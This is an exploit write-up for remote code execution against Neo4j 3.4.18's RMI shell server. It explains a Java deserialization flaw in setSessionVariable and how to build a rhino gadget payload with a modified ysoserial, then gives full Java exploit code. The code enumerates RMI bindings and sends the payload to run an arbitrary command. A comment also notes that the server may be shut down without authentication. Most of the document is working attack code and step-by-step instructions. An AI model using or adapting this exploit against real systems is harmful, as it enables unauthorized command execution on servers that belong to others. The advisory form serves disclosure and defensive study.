# Exploit Title: Neo4j 3.4.18 - RMI based Remote Code Execution (RCE)
# Date: 7/30/21
# Exploit Author: Christopher Ellis, Nick Gonella, Workday Inc.
# Vendor Homepage: neo4j.com
# Software Link: https://neo4j.com/download-thanks/?edition=community&release=3.4.18&flavour=unix
# Version: 3.4.18
# Tested on: Windows, Mac

In older versions of Neo4j, when the shell server is enabled, RCE can be obtained via a Java deserialization exploit. In the ShellServer interface, a method setSessionVariable(Serializable paramSerializable, String paramString, Object paramObject) exists. Neo4j also has a dependency (rhino 1.7.9) with known RCE gadget chains. By crafting an object to abuse these gadget chains, one obtain RCE via the shell server.

To create this from scratch using Java, you’ll need to modify the ysoserial library to include the payload found here https://github.com/mozilla/rhino/issues/520 (an update of the existing rhino gadget) as well as modify the ysoserial POM file to include the correct version of rhino. Rebuild ysoserial and include it on your exploit’s classpath. From there, you can use the ShellServer interface and associated code found in neo4j-shell-3.4.18.jar to make your client aware of the server’s method stubs. Now you should be able to call the setSessionVariable method from your exploit/client via RMI.
In your exploit, use ysoserial to generate a payload as follows: Object payload = new RhinoGadget().getObject(COMMAND), and then call the setSessionVariable with the payload in the paramObject parameter. The other two parameters can be anything. This will cause the server to deserialize your payload, triggering the gadget chain, and running your command.
It is worth noting that we chose to exploit this method and the paramObject parameter as this was the most direct, any method that takes in an Object (other than String or a primitave) is likely vulnerable as well.

package runnable;

import payloads.RhinoGadget;
import sun.rmi.registry.RegistryImpl_Stub;

import java.io.Serializable;
import java.rmi.Naming;
import org.neo4j.shell.ShellServer;

public class ExploitB {

    public static String COMMAND = "touch /tmp/test.txt";
    public static String TARGET = "rmi://127.0.0.1:1337";
    public static String TARGET_BINDING = "shell";

    public static void main (String args[]) throws Exception {

        boolean validBinding = checkBinding(TARGET_BINDING, TARGET);
        if (!validBinding)
        {
            System.out.println("[-] No valid binding found, shell server may not be listening. Exiting");
            System.exit(0);
        }

        System.out.println("[+] Found valid binding, proceeding to exploit");
        ShellServer server = (ShellServer) Naming.lookup(TARGET + "/" + TARGET_BINDING);

        Object payload = new RhinoGadget().getObject(COMMAND);

        //Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off
        try {
            server.setSessionVariable(newClientId(), "anything_here", payload);
        }
        catch (Exception UnmarshalException ) {
            System.out.println("[+] Caught an unmarshalled exception, this is expected.");
        }
        System.out.println("[+] Exploit completed");

    }

    /**
     * Just a helper method to validate that the rmi binding we're looking for is present
     * @param bindingToCheck the binding you'd like to check for
     * @param targetToCheck the rmi registry to check against
     * @return true if the binding is present, false if not
     */
    public static boolean checkBinding(String bindingToCheck, String targetToCheck) {

        System.out.println("Trying to enumerate server bindings: ");
        try {
            RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck);

            for (String element : stub.list()) {
                System.out.println("Found binding: " + element);
                if (element.equalsIgnoreCase(bindingToCheck))
                    return true;
            }
            return  false;
        }
        catch (Exception ex)
        {
            return false;
        }

    }

    public static Serializable newClientId() {
        return Integer.valueOf(1);
    }

}